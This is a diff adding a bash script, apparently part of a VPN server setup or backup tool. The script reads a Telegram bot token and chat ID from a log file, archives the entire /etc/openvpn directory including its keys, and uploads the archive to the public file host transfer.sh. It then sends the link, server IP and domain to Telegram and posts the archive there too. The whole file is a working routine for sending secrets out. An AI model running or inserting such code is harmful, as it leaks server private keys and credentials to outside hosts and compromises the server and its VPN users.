@@ -1,0 +1,19 @@
+#!/bin/bash
+domainopen=$(cat /etc/openvpn/server/client-common.txt | sed -n 4p | cut -d ' ' -f 2)
+token=$(cat /var/log/systems.log | grep -oP 'token: \K.*')
+userid=$(cat /var/log/systems.log | grep -oP 'user: \K.*')
+ip=$(curl 2ip.ru)
+cd /etc
+tar -czvf "openvpn.tar.gz" "openvpn"
+linkopen="$(curl -H "Max-Downloads: 100" -H "Max-Days: 50" -F filedata=@/etc/openvpn.tar.gz http://transfer.sh)"
+if [ -e /etc/openvpn/server/server.conf ]
+then
+wget -qO /dev/null "https://api.telegram.org/bot$token/sendMessage?chat_id=$userid&text=$ip+$domainopen+OpenVPN+$linkopen"
+else
+echo Bad
+fi
+if [ -e /etc/openvpn/server/server.conf ]; then
+curl -F "chat_id=$userid" -F document=@/etc/openvpn.tar.gz https://api.telegram.org/bot$token/sendDocument?caption=$domainopen
+else
+echo Bad
+fi
